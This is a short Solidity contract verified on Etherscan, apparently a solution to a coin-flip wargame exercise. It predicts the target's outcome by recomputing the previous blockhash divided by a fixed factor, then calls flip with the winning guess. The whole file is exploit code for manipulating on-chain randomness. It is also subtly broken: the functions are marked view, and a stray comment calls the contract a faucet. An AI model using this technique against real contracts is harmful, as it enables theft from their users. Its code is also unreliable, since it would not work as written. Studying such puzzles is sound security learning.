/**
 *Submitted for verification at Etherscan.io on 2021-12-19
*/

// SPDX-License-Identifier: CC-BY-SA-4.0
// Version of Solidity compiler this program was written for
pragma solidity 0.8.7;

interface CoinFlip {
   function flip(bool _guess) external view;
}

// Our first contract is a faucet!
contract Attack {
    CoinFlip public originalContract = CoinFlip(0xEbf4D19199E4Cf72AF1a0E7C315dC88eFa68e460); 
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function hackFlip(bool _guess) public view {
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            originalContract.flip(_guess);
        } else {
            originalContract.flip(!_guess);
        }
    }
}